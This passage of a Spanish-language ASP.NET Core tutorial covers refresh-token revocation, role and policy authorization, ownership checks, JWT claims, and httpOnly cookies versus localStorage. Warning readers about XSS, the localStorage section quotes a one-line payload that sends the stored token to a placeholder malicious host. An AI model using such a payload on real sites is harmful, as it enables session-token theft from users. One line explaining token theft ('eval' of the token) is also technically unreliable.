return Ok(await BuildAuthResponseAsync(user, roles));
```

Genera el nuevo par (JWT + RefreshToken) y lo devuelve. `BuildAuthResponseAsync` es el helper que construye la respuesta — crear el JWT nuevo, crear el RefreshToken nuevo, y guardarlo en la DB.

---

## Revocación manual

```csharp
[HttpPost("revoke")]
[Authorize]
public async Task<IActionResult> Revoke(
    [FromBody] RevokeTokenRequest request)
{
    var refreshToken = await _context.RefreshTokens
        .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);

    if (refreshToken is null)
        throw new NotFoundException("Refresh token not found");

    if (!refreshToken.IsActive)
        throw new DomainException("Token is already inactive");

    var currentUserId = User.FindFirstValue(ClaimTypes.NameIdentifier);
    var isAdmin = User.IsInRole(RoleNames.Admin);

    // Puedes revocar tu propio token O ser admin
    if (refreshToken.UserId.ToString() != currentUserId && !isAdmin)
        throw new UnauthorizedException("You cannot revoke this token");

    refreshToken.Revoke("Manually revoked");
    await _context.SaveChangesAsync();

    return NoContent();
}
```

**Control de acceso:** Solo tú puedes revocar tu token, o un admin puede revocar cualquiera.

### Línea por línea

```csharp
[HttpPost("revoke")]
[Authorize]
```

A diferencia de `refresh`, este endpoint SÍ requiere autenticación — para revocar un token necesitas estar logueado. `[Authorize]` sin roles significa "cualquier usuario autenticado".

```csharp
var refreshToken = await _context.RefreshTokens
    .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);
```

Busca el token a revocar en la DB. Viene en el body — el cliente lo envía cuando decide cerrar sesión en ese dispositivo.

```csharp
if (refreshToken is null)
    throw new NotFoundException("Refresh token not found");
```

Si no existe, 404. No es un error de auth — es un recurso que no se encontró.

```csharp
if (!refreshToken.IsActive)
    throw new DomainException("Token is already inactive");
```

Si ya está revocado o expirado, no hay nada que hacer.

```csharp
var currentUserId = User.FindFirstValue(ClaimTypes.NameIdentifier);
var isAdmin = User.IsInRole(RoleNames.Admin);
```

**Esto es el corazón de la autorización.** `User` es el usuario autenticado (ya verificado por el middleware). `FindFirstValue` lee el claim de su ID. `IsInRole` pregunta si es admin.

```csharp
if (refreshToken.UserId.ToString() != currentUserId && !isAdmin)
    throw new UnauthorizedException("You cannot revoke this token");
```

La regla de negocio: puedes revocar TU token, o si eres admin, el de cualquiera. Cualquier otra combinación → rechazada.

```csharp
refreshToken.Revoke("Manually revoked");
await _context.SaveChangesAsync();
return NoContent();
```

Marca revocado, guarda y devuelve 204 (sin contenido). El logout en un dispositivo específico está hecho.

---

## Usar roles y policies en el controller

Ya autenticas. Ahora **autorizas** — decidir quién puede hacer qué.

### Roles en el controller

```csharp
[HttpDelete("{id}")]
[Authorize(Roles = "Admin,Manager")]
public async Task<IActionResult> DeleteAppointment(int id)
{
    var appointment = await _unitOfWork.Repository<Appointment>()
        .GetEntityWithSpec(new AppointmentByIdSpec(id));

    if (appointment is null)
        throw new NotFoundException(nameof(Appointment), id);

    _unitOfWork.Repository<Appointment>().Remove(appointment);
    await _unitOfWork.Complete();

    return NoContent();
}
```

**`[Authorize(Roles = "Admin,Manager")]`** — solo Admin o Manager pueden borrar.

#### Línea por línea

```csharp
[Authorize(Roles = "Admin,Manager")]
```

El atributo que hace el filtrado. La lista separada por comas es un **OR** — Admin O Manager. Si no tienes ninguno de esos roles, ASP.NET devuelve 403 (Forbidden) antes de que el método se ejecute.

```csharp
var appointment = await _unitOfWork.Repository<Appointment>()
    .GetEntityWithSpec(new AppointmentByIdSpec(id));
```

Carga la cita desde la DB usando Unit of Work + Specification (los patrones de las páginas anteriores). `GetEntityWithSpec` aplica el filtro por ID.

```csharp
if (appointment is null)
    throw new NotFoundException(nameof(Appointment), id);
```

Si la cita no existe → 404. El `nameof(Appointment)` evita errores de tipeo: si renombras la clase, el compilador te avisa.

```csharp
_unitOfWork.Repository<Appointment>().Remove(appointment);
await _unitOfWork.Complete();
```

Marca la entidad para eliminar y confirma con un solo `SaveChanges` (Unit of Work). Todo o nada.

```csharp
return NoContent();
```

204 — la eliminación fue exitosa y no hay cuerpo que devolver.

### Policies — autorización más compleja

```csharp
// En Program.cs
services.AddAuthorization(opt =>
{
    opt.AddPolicy("RequireAdmin",
        policy => policy.RequireRole(RoleNames.Admin));
    
    opt.AddPolicy("RequireEmployeeOrManager",
        policy => policy.RequireRole(RoleNames.Manager, RoleNames.Employee));
    
    // Policy personalizada
    opt.AddPolicy("OwnResourceOrAdmin", policy =>
        policy.RequireAssertion(context =>
        {
            var userId = context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            var resourceOwnerId = context.Resource as string; // El resource viene del controller
            var isAdmin = context.User.IsInRole(RoleNames.Admin);

            return userId == resourceOwnerId || isAdmin;
        }));
});
```

#### Línea por línea

```csharp
opt.AddPolicy("RequireAdmin",
    policy => policy.RequireRole(RoleNames.Admin));
```

`RequireRole` con múltiples argumentos es un OR — cualquiera de los roles pasa. Es la forma declarativa de `[Authorize(Roles = "...")]` pero centralizada en Program.cs y reutilizable.

```csharp
opt.AddPolicy("OwnResourceOrAdmin", policy =>
    policy.RequireAssertion(context =>
    {
        ...
    }));
```

`RequireAssertion` permite una validación arbitraria — un delegate que recibe el contexto de autorización y devuelve `true`/`false`. Aquí: el dueño del recurso O un admin.

**Nota sobre `context.Resource`:** en la práctica, cuando usas `[Authorize(Policy = "...")]`, `context.Resource` es el `HttpContext`, no tu recurso. Para policy basada en el dueño del recurso, la forma limpia es usar un `IAuthorizationHandler` con un requirement propio — o, como en el ejemplo siguiente, verificar el dueño dentro del controller.

### Verificación de propiedad en el controller

```csharp
[HttpGet("{id}")]
[Authorize]
public async Task<ActionResult<AppointmentDto>> GetAppointment(int id)
{
    var appointment = await _unitOfWork.Repository<Appointment>()
        .GetEntityWithSpec(new AppointmentByIdSpec(id));

    if (appointment is null)
        throw new NotFoundException(nameof(Appointment), id);

    // Solo tu propia cita o si eres admin
    if (appointment.PatientId != _currentUser.Id && !User.IsInRole(RoleNames.Admin))
        throw new UnauthorizedException("You cannot access this appointment");

    return Ok(mapper.Map<AppointmentDto>(appointment));
}
```

#### Línea por línea

```csharp
[Authorize]
```

Cualquier usuario autenticado pasa el filtro. La autorización fina (¿es SU cita?) se hace adentro — porque depende de datos que solo conoces al cargar el recurso.

```csharp
if (appointment.PatientId != _currentUser.Id && !User.IsInRole(RoleNames.Admin))
    throw new UnauthorizedException("You cannot access this appointment");
```

**La verificación de propiedad.** Compara el dueño de la cita contra el usuario autenticado. `&& !isAdmin` — los admins ven todo. Si no eres el dueño ni admin → 403.

La lección: el rol decide *qué categoría de acciones* puedes hacer (borrar citas, revocar tokens). La propiedad decide *sobre qué registros* puedes hacerlas. Los roles son amplios; la propiedad es por registro.

---

## Claims — más allá de roles

Los claims son la información que viaja dentro del token. En el `CreateToken` del service agregas los que necesites:

```csharp
public async Task<string> CreateToken(AppUser user)
{
    var claims = new List<Claim>
    {
        new Claim(ClaimTypes.NameIdentifier, user.Id), // Sub
        new Claim(ClaimTypes.Email, user.Email ?? ""),
        new Claim(ClaimTypes.Name, user.UserName ?? ""),
        new Claim("FullName", user.FullName), // Custom claim
        new Claim("TenantId", user.TenantId.ToString()), // Custom claim
        new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
    };

    var roles = await _userManager.GetRolesAsync(user);
    foreach (var role in roles.Distinct())
    {
        claims.Add(new Claim(ClaimTypes.Role, role));
    }

    // ... signing logic ...
}
```

### Línea por línea

```csharp
new Claim(ClaimTypes.NameIdentifier, user.Id),  // Sub
```

El claim estándar de identidad — el ID del usuario. `ClaimTypes.NameIdentifier` es la constante que en el token se llama `sub`.

```csharp
new Claim(ClaimTypes.Name, user.UserName ?? ""),
```

El nombre de usuario. Claim estándar `name`.

```csharp
new Claim("FullName", user.FullName), // Custom claim
new Claim("TenantId", user.TenantId.ToString()),  // Custom claim
```

**Claims custom.** No vienen predefinidos en el estándar JWT — los inventas tú. La cadena es la llave con la que los lees después. `FullName` evita que el frontend tenga que componer el nombre. `TenantId` le dice a cada request a qué tenant pertenece el usuario.

```csharp
new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
```

`Jti` = JWT ID. Un identificador único por token. Sirve para revocación por token individual y para detectar tokens reutilizados (replay attacks).

```csharp
foreach (var role in roles.Distinct())
{
    claims.Add(new Claim(ClaimTypes.Role, role));
}
```

Roles como claims con el tipo estándar `ClaimTypes.Role`. El framework los lee automáticamente para `[Authorize(Roles = ...)]` y `User.IsInRole(...)` — por eso esas APIs funcionan sin que tú hagas nada más.

En el controller, accedes a los claims:

```csharp
var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
var email = User.FindFirstValue(ClaimTypes.Email);
var fullName = User.FindFirstValue("FullName");
var tenantId = User.FindFirstValue("TenantId");
```

### Línea por línea

```csharp
var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
```

`User` es el `ClaimsPrincipal` ya autenticado (lo armó el middleware de autenticación). `FindFirstValue` busca el claim por su tipo y devuelve el valor como string. Si el claim no existe, devuelve `null`.

```csharp
var tenantId = User.FindFirstValue("TenantId");
```

Lees los custom claims con la misma cadena con la que los creaste. Aquí el `TenantId` se vuelve útil — cada request puede filtrar por tenant sin ir a la DB.

**Diferencia roles vs claims:**

- **Roles:** categorías amplias (Admin, Manager, Employee)
- **Claims:** información específica (TenantId, DepartmentId, Permissions)

Un usuario puede tener múltiples roles. Los claims son datos que necesitas para ejecutar lógica de negocio.

---

## httpOnly Cookies vs localStorage

Una decisión que muchos ignoran: dónde guardas el JWT en el navegador.

### localStorage (vulnerable pero conveniente)

```javascript
// En el navegador
localStorage.setItem('token', jwt);

// Problema: JavaScript puede leerlo
// Attacker hace: eval(localStorage.token) y lo obtiene
// O con XSS: <img src=x onerror="fetch('https://malicious.com/steal?token=' + localStorage.token)">
```

### httpOnly Cookies (más seguro)

```csharp
Response.Cookies.Append("token", jwt, new CookieOptions
{
    HttpOnly = true, // JavaScript NO puede leer esta cookie
    Secure = true,  // Solo viaja por HTTPS
    SameSite = SameSiteMode.Strict, // Evita CSRF
    Expires = DateTimeOffset.UtcNow.AddMinutes(60)
});
```

### Línea por línea

```csharp
Response.Cookies.Append("token", jwt, new CookieOptions
```

Le dices al navegador: "guarda esto como cookie". `Response` es el HTTP response actual; `jwt` es el token que quieres guardar.

```csharp
HttpOnly = true,
```

**La clave.** JavaScript del navegador NO puede leer esta cookie con `document.cookie`. Si hay un ataque XSS, el attacker no puede robar el token porque el código JS ni siquiera lo ve.

```csharp
Secure = true,
```

La cookie solo viaja por HTTPS. En un request HTTP plano, no se envía.

```csharp
SameSite = SameSiteMode.Strict,
```

La cookie solo se envía si el request viene del mismo sitio. Un sitio malicioso no puede forzar a tu navegador a mandarla (mitiga CSRF).

```csharp
Expires = DateTimeOffset.UtcNow.AddMinutes(60)
```

La cookie expira junto con el JWT. Sin esta línea, sería una session cookie que muere al cerrar el navegador.

**Ventajas:**
- JavaScript no puede acceder (protege contra XSS)
- El navegador la envía automáticamente en cada request
- No tienes que guardarla en código

**Desventajas:**
- CSRF es un riesgo (mitigado con SameSite)
- No funciona bien con CORS (cross-origin)

**La decisión:** Para apps SPA modernas, localStorage es práctico. Para máxima seguridad, httpOnly cookies + CSRF tokens.

---

## El resumen honesto

JWT + Identity es:

**"El usuario se loguea, le das un token firmado, él lo guarda, lo envía en cada request, tú lo verificas sin tocar la DB, y si expira, usa el refresh token para uno nuevo sin loguear de nuevo."**

- Stateless (escalable)
- Seguro si lo haces bien
- Auditable (tokens revocados quedan en la DB)
- Estándar (JWT se entiende en cualquier lado)

Lo que duele:

- Si robas un JWT, vives 60 minutos con acceso
- Si robas ambos (JWT + RefreshToken), vives 7 días
- Si un usuario lo roba, necesitas revocación manual
- HTTPS es **obligatorio** (sin él, el token viaja en plain)

*No es perfecto. Pero es lo mejor que tenemos.*

---
